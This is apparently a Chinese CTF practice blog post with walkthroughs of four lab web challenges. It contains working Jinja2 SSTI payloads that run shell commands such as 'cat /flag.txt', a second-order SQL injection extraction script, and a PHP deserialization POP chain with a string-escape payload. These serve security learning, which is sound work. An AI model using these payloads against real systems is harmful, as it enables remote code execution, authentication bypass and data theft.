---
title: Nep-week5
date: 2021-5-4
author: 1_N

---
## 总结
刷题，刷题，还是XX的刷题     

## Double Secret

打开是这样  


![01.png](https://img10.360buyimg.com/ddimg/jfs/t1/172299/33/6670/3057/6087c133E05eb4964/f7d5c0725165dfea.png)       




各种找，发现`robots.txt`       
有一句话-----`It is Android ctf`      
????    

然后就扫目录，`/secrect`      

得到：`Tell me your secret.I will encrypt it so others can't see`       

传入参数：`?secrect=123`       
---->`d]`      

然后试试其他的，感觉也没什么规律        

当我输了一个大的数后，  报错了        
`?secrect=123123` 


![02.png](https://img12.360buyimg.com/ddimg/jfs/t1/164560/32/20921/70003/6087c295Ee2b4b2b0/3375b41da3b33055.png)  



然后就不知道怎么继续了     

WP       


主要点：



![03.png](https://img13.360buyimg.com/ddimg/jfs/t1/189991/37/260/20393/6087c2e6E7772c1a4/0a96aad8ab0d1ac7.png)      



对传入的参数进行RC4解密，然后经过`render_template_string`      
这里存在SSTI      




RC4加密脚本         


	


	
	```python
	import base64
	from urllib import parse
	
	
	def rc4_main(key="init_key", message="init_message"):  # 返回加密后得内容
	    s_box = rc4_init_sbox(key)
	    crypt = str(rc4_excrypt(message, s_box))
	    return crypt
	
	
	def rc4_init_sbox(key):
	    s_box = list(range(256))
	    j = 0
	    for i in range(256):
	        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
	        s_box[i], s_box[j] = s_box[j], s_box[i]
	    return s_box
	
	
	def rc4_excrypt(plain, box):
	    res = []
	    i = j = 0
	    for s in plain:
	        i = (i + 1) % 256
	        j = (j + box[i]) % 256
	        box[i], box[j] = box[j], box[i]
	        t = (box[i] + box[j]) % 256
	        k = box[t]
	        res.append(chr(ord(s) ^ k))
	    cipher = "".join(res)
	    return str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')
	
	
	key = "HereIsTreasure"  # 此处为密文
	message = input("请输入明文:\n")
	enc_base64 = rc4_main(key, message)
	enc_init = str(base64.b64decode(enc_base64), 'utf-8')
	enc_url = parse.quote(enc_init)
	print("rc4加密后的url编码:" + enc_url)
	# print("rc4加密后的base64编码"+enc_base64)
	```


明文输入SSTI的payload：     
`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") }}{% endif %}{% endfor %}`     





![05.png](https://img13.360buyimg.com/ddimg/jfs/t1/166916/2/20756/717273/6087c89fEf400f1c8/5d5e711f5e5060ff.png)      








![04.png](https://img12.360buyimg.com/ddimg/jfs/t1/186127/13/1163/8759/6087c863E6220db00/67e1250969f3a7eb.png)        








虽然有个报错（那个safe函数），但还是得到了结果。

`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()") }}{% endif %}{% endfor %}`  
得到flag       



[Rc4加密](https://blog.csdn.net/qq_41381461/article/details/100991617?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control)

## Unfinish
打开环境




![01.png](https://img11.360buyimg.com/ddimg/jfs/t1/181130/17/1544/29996/608ad77eE7e059785/fcb10cb3973eb937.png)      







URL为：`http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php`     

有`login.php`,看下有没有`register.php`      

果然      






![02.png](https://img11.360buyimg.com/ddimg/jfs/t1/189730/22/621/29267/608ad7f4Eb2fe540a/175965ef798babd3.png)  







随便注册个看看   




![03.png](https://img11.360buyimg.com/ddimg/jfs/t1/194217/13/548/131720/608ad830E2605bd5a/3e109deab88c8cf1.png)    












  
可以看到在侧边栏这里显示了我们的用户名          

二次注入       

过滤了`,`和`information`      
所以没法报错注了     

新姿势`0'+hex(hex(database()))+'0`       

之所以要两次hex编码是因为，一次编码产生的结果里可能有字母，加0后就成了字母前面的纯数字      



![04.png](https://img11.360buyimg.com/ddimg/jfs/t1/186262/16/1480/306644/608ad9e5Eb3f7074c/bf9784e6e02681be.png)        




数字过大转为了科学计数法       

用substr,`,`被过，变为`from x for x`       




![05.png](https://img14.360buyimg.com/ddimg/jfs/t1/185436/35/1509/304850/608ada67E0214a5f5/8198055dc97e7fa4.png)        




也可以`ascii(substr(database() from 1 for 1))`

得到database()是web       

但information被过，所以没法读表啥的        

看别人WP都是猜的`select * from flag`      

(啊这)    



最后写个脚本跑一下     





	```python
	import requests
	import re
	from time import sleep
	
	
	flag = ''
	url = 'http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/'
	url1 = url+'register.php'
	url2 = url+'login.php'
	for i in range(100):
	    sleep(0.3)
	    data1 = {"email": "1234{}@123.com".format(
	        i), "username": "0'+ascii(substr((select * from flag) from {} for 1))+'0;".format(i), "password": "123"}
	    data2 = {"email": "1234{}@123.com".format(i), "password": "123"}
	    r1 = requests.post(url1, data=data1)
	    r2 = requests.post(url2, data=data2)
	    res = re.search(r'<span class="user-name">\s*(\d*)\s*</span>', r2.text)
	    res1 = re.search(r'\d+', res.group())
	    flag = flag+chr(int(res1.group()))
	    print(flag)   
	```


  





![06.png](https://img13.360buyimg.com/ddimg/jfs/t1/175950/30/7065/148511/608adb94E422ae4f9/34785ddab5c3f6fc.png)






## I_<3_Flask
打开环境



![01.png](https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188/9767/6086ba66E2717eebd/6a88b62e64abede0.png)       




题目是flask，应该是SSTI了吧       
但没参数        

[`arjun`](https://github.com/rakjong/Arjun)     
这个可以来爆破参数      
先下载，然后到arjun目录下



![02.png](https://img13.360buyimg.com/ddimg/jfs/t1/180871/9/1120/185944/6086bbb1E090ab472/52e2d85cb4d99503.png)       




安装  



![03.png](https://img12.360buyimg.com/ddimg/jfs/t1/196052/31/68/531183/6086bbb4E1c038775/a9233572bd309699.png)        







使用      







![04.png](https://img11.360buyimg.com/ddimg/jfs/t1/166728/7/20579/248205/6086bbb1E09bb265d/265b5c678e16dd73.png)        








爆破出参数是name        

除此之外就没啥了      
payload：`{{().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")}}`       


`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`     
两个都行






![05.png](https://img12.360buyimg.com/ddimg/jfs/t1/189306/16/158/12638/6086bc79E75a9f880/16bb47b996587c46.png)










## Easyphp
打开环境






![01.png](https://img12.360buyimg.com/ddimg/jfs/t1/186967/37/782/447665/608c1c8bE8f062515/dd33c81b065b285b.png)







没有`registe.php`     

一开始猜的是SQL注入       

注入了一会，有点想放弃了，看了下`www.zip`   

居然有     

看来不是SQLi了      

四个PHP文件    



`index.php`      




	```php
	<?php
	require_once "lib.php";
	
	if(isset($_GET['action'])){
		require_once(__DIR__."/".$_GET['action'].".php");
	}
	else{
		if($_SESSION['login']==1){
			echo "<script>window.location.href='./index.php?action=update'</script>";
		}
		else{
			echo "<script>window.location.href='./index.php?action=login'</script>";
		}
	}
	?>
	```



`lib.php`        



	```php
	<?php
	error_reporting(0);
	session_start();
	function safe($parm)
	{
	    $array = array('union', 'regexp', 'load', 'into', 'flag', 'file', 'insert', "'", '\\', "*", "alter");
	    return str_replace($array, 'hacker', $parm);
	}
	class User
	{
	    public $id;
	    public $age = null;
	    public $nickname = null;
	    public function login()
	    {
	        if (isset($_POST['username']) && isset($_POST['password'])) {
	            $mysqli = new dbCtrl();
	            $this->id = $mysqli->login('select id,password from user where username=?');
	            if ($this->id) {
	                $_SESSION['id'] = $this->id;
	                $_SESSION['login'] = 1;
	                echo "你的ID是" . $_SESSION['id'];
	                echo "你好！" . $_SESSION['token'];
	                echo "<script>window.location.href='./update.php'</script>";
	                return $this->id;
	            }
	        }
	    }
	    public function update()
	    {
	        $Info = unserialize($this->getNewinfo());
	        $age = $Info->age;
	        $nickname = $Info->nickname;
	        $updateAction = new UpdateHelper($_SESSION['id'], $Info, "update user SET age=$age,nickname=$nickname where id=" . $_SESSION['id']);
	        //这个功能还没有写完 先占坑
	    }
	    public function getNewInfo()
	    {
	        $age = $_POST['age'];
	        $nickname = $_POST['nickname'];
	        return safe(serialize(new Info($age, $nickname)));
	    }
	    public function __destruct()
	    {
	        return file_get_contents($this->nickname); //危
	    }
	    public function __toString()
	    {
	        $this->nickname->update($this->age);
	        return "0-0";
	    }
	}
	class Info
	{
	    public $age;
	    public $nickname;
	    public $CtrlCase;
	    public function __construct($age, $nickname)
	    {
	        $this->age = $age;
	        $this->nickname = $nickname;
	    }
	    public function __call($name, $argument)
	    {
	        echo $this->CtrlCase->login($argument[0]);
	    }
	}
	class UpdateHelper
	{
	    public $id;
	    public $newinfo;
	    public $sql;
	    public function __construct($newInfo, $sql)
	    {
	        $newInfo = unserialize($newInfo);
	        $upDate = new dbCtrl();
	    }
	    public function __destruct()
	    {
	        echo $this->sql;
	    }
	}
	class dbCtrl
	{
	    public $hostname = "127.0.0.1";
	    public $dbuser = "root";
	    public $dbpass = "root";
	    public $database = "test";
	    public $name;
	    public $password;
	    public $mysqli;
	    public $token;
	    public function __construct()
	    {
	        $this->name = $_POST['username'];
	        $this->password = $_POST['password'];
	        $this->token = $_SESSION['token'];
	    }
	    public function login($sql)
	    {
	        $this->mysqli = new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
	        if ($this->mysqli->connect_error) {
	            die("连接失败，错误:" . $this->mysqli->connect_error);
	        }
	        $result = $this->mysqli->prepare($sql);
	        $result->bind_param('s', $this->name);
	        $result->execute();
	        $result->bind_result($idResult, $passwordResult);
	        $result->fetch();
	        $result->close();
	        if ($this->token == 'admin') {
	            return $idResult;
	        }
	        if (!$idResult) {
	            echo ('用户不存在!');
	            return false;
	        }
	        if (md5($this->password) !== $passwordResult) {
	            echo ('密码错误！');
	            return false;
	        }
	        $_SESSION['token'] = $this->name;
	        return $idResult;
	    }
	    public function update($sql)
	    {
	        //还没来得及写
	    }
	}
	```



`login.php`      




	```php
	<?php
	require_once('lib.php');
	?>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
	<title>login</title>
	<center>
		<form action="login.php" method="post" style="margin-top: 300">
			<h2>百万前端的用户信息管理系统</h2>
			<h3>半成品系统 留后门的程序员已经跑路</h3>
	        		<input type="text" name="username" placeholder="UserName" required>
			<br>
			<input type="password" style="margin-top: 20" name="password" placeholder="password" required>
			<br>
			<button style="margin-top:20;" type="submit">登录</button>
			<br>
			<img src='img/1.jpg'>大家记得做好防护</img>
			<br>
			<br>
	<?php 
	$user=new user();
	if(isset($_POST['username'])){
		if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['username'])){
			die("<br>Damn you, hacker!");
		}
		if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['password'])){
			die("Damn you, hacker!");
		}
		$user->login();
	}
	?>
		</form>
	</center>
	```




`update.php`       




	```php
	<?php
	require_once('lib.php');
	echo '<html>
	<meta charset="utf-8">
	<title>update</title>
	<h2>这是一个未完成的页面，上线时建议删除本页面</h2>
	</html>';
	if ($_SESSION['login']!=1){
		echo "你还没有登陆呢！";
	}
	$users=new User();
	$users->update();
	if($_SESSION['login']===1){
		require_once("flag.php");
		echo $flag;
	}
	
	?>
	```




这个网站的逻辑就是要以admin登录，通过SQL语句查询，比较ID和passwd，正确的话，跳转到`update.php`，得到flag    


主要是`lib.php`     
    
	
	function safe($parm)
	{
	    $array = array('union', 'regexp', 'load', 'into', 'flag', 'file', 'insert', "'", '\\', "*", "alter");
	    return str_replace($array, 'hacker', $parm);
	}

看到这个，应该想到那个反序列化的字符逃逸了    
	
	$this->id = $mysqli->login('select id,password from user where username=?');         

********
	public function __call($name, $argument)
	    {
	        echo $this->CtrlCase->login($argument[0]);
	    }



两个login，而且第二个login的参数是可控的     

所以     

以此，构造pop链反序列化修改SQL语句     

入口--->update.php里的       

	$users=new User();
	$users->update();        

跟进`lib.php`里的update()      

首先`  $Info = unserialize($this->getNewinfo());`应该是出口了      


这个`$updateAction = new UpdateHelper($_SESSION['id'],$Info, "update user SET age=$age,nickname=$nickname where id=" . $_SESSION['id']);`    


跟进`UpdateHelper`    

`$sql`没有使用，且`echo $this->sql;`        

让`sql=new User()`来触发toString     


	public function __toString()
	    {
	        $this->nickname->update($this->age);
	        return "0-0";
	    } 

让`nickname=new Info()`来触发`__call`

    public function __call($name, $argument)
    {
        echo $this->CtrlCase->login($argument[0]);
    }      

接着让`CtrlCase=new dbCtrl()`就可以执行自定的SQL了    

将password修改     

	select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?

c4ca4238a0b923820dcc509a6f75849b是1的MD5值      





![03.png](https://img12.360buyimg.com/ddimg/jfs/t1/192784/20/706/130842/608c3197Ec5588c09/d8bef464f63eb40a.png)








这样再控制dbCtrl里的name和password就可以以admin登录       

之后     

	$_SESSION['token'] = $this->name;
	        return $idResult;      

重新登陆时不管密码是什么都能登陆成功，得到flag了     





	```php
	<?php
	class UpdateHelper
	{
	    public $sql;
	    public function __construct()
	    {
	        $this->sql=new User();
	    }
	
	}
	
	class User
	{
	    public $age;
	    public $nickname;
	    public function __construct()
	    {
	        
	        $this->age='select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?';
	        $this->nickname=new Info();
	    }
	}
	
	class Info
	{
	    public $CtrlCase;
	    public function __construct()
	    {
	        $this->CtrlCase=new dbCtrl();
	    }
	}
	class dbCtrl
	{
	    public $name='admin';
	    public $password='1';
	}
	
	$a=new UpdateHelper();
	echo serialize($a);
	```



结果为

	O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" 
	from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}      


回到出口处     

`getNewInfo()`中     

	return safe(serialize(new Info($age, $nickname)));     

这里序列化的是一个新类，这样的话，刚才得到的payload只会被视为一个长的字符串，并不会被反序列化       

所以要字符逃逸       

	

	```php
	<?php
	class Info
	{
	    public $age=1;
	    public $nickname='123';
	    public $CtrlCase=123;
	}
	$a=new Info();
	echo serialize($a);  
	```

    

输出：`O:4:"Info":3:{s:3:"age";i:1;s:8:"nickname";s:3:"123";s:8:"CtrlCase";i:123;}`       

要想逃逸，需要再刚才的payload前加上`";s:8:"CtrlCase";`（`"`来闭合序列化后生成的`"`）后面加上`}`来提前结束反序列化     


payload:`";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}`      





![02.png](https://img12.360buyimg.com/ddimg/jfs/t1/179326/17/1720/143813/608c2f0bEd5a3e0ed/156a14c371a68116.png)






可以看到长度为263       

在双引号中加入263个union，或者其他（那个safe函数中的，只要凑够263即可）      

经过safe函数后，就多出263个，就将原来的263个逃逸出来了       

最终payload：

   	age=1&nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}        


在`update.php`页面POST提交，重新登录（admin，密码随意（因为反序列化登录后`$_SESSION['login'] = 1;`））得到flag